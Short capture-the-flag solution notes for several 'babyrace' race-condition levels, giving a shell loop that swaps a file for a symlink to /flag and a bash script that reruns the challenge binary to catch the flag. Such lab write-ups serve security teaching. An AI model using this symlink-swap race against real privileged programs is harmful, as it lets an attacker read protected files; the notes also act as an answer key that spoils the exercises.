# Race Condition

## babyrace_level1.0

- Run a script that executes 3 commands repeatedly:

    ```shell
    touch my_file
    ln -sf /flag my_file
    rm my_file
    ```

## babyrace_level1.1

- There is no hint, try the same method, it works!

## babyrace_level2.0

- A race condition with a tighter timing window to read the flag. The script for level 1 still works!

## babyrace_level2.1

- Repeating the challenge manually is hard to get the flag, run another script that repeats the challenge automatically:
    ```shell
    #!/bin/bash

    # Usage: ./repeat_challenge.sh 2.1
    for i in {0..100000}
    do
        /challenge/babyrace_level$1 my_file | grep 'pwn'
    done
    ```
